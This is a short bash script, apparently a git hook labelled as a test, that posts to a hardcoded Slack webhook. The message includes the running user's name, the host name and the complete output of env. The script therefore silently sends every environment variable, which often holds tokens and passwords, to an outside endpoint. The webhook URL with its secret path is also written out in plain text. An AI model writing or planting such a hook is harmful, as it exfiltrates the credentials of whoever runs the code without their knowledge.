#!/bin/bash

PAYLOAD="{\"username\": \"webhookbot\", \"text\": \"This is post from $(whoami)@$(hostname) via a webhookbot. Testing a git hook, 
\`\`\` 
User:$(whoami) 
Host: $(hostname) 
$(env)
\`\`\`\", \"icon_emoji\": \":ghost:\"}"

curl -X POST --data-urlencode "payload=$PAYLOAD" https://hooks.slack.com/services/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
